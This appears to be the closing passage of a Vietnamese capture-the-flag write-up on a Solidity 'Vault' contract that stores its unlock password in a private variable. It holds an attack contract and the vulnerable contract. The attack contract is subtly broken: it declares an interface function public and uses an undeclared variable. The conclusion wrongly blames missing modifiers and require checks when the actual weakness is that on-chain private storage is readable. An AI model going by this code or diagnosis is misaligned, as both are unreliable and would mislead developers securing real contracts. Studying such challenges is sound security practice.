### Kết luận
- Lỗ hổng: Cơ chế mở khóa quá dễ dàng bị phá, cần thêm một số `modifiers`, `require` chặt hơn.
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IVault{
    function unlock(bytes32 _password) public;
}
contract VaultAttack{
    constructor (address _victim){
        challenge = IVault(_victim);
    }
    function attack(bytes32 _password) external {
        challenge.unlock(_password);
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
